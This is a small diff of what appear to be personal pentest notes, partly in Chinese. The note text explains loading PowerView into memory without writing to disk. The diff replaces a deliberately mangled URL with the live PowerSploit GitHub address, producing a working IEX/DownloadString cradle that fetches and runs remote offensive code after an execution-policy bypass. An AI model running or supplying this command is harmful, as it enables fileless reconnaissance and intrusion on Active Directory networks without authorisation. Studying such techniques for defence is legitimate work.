@@ -39,4 +39,4 @@ Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 >>> PowerView:
   >>>> 直接下載 PowerView並載入到 記憶體中, 不落Harddisk:
-    IEX (New-Object Net.WebClient).DownloadString("dfsbnvjksdbkj://raw.githubusercontent_dot_com//PowerView"我故意改成這樣的, 強調: 不要去爬這個浪費時間和poe點數)
+    IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
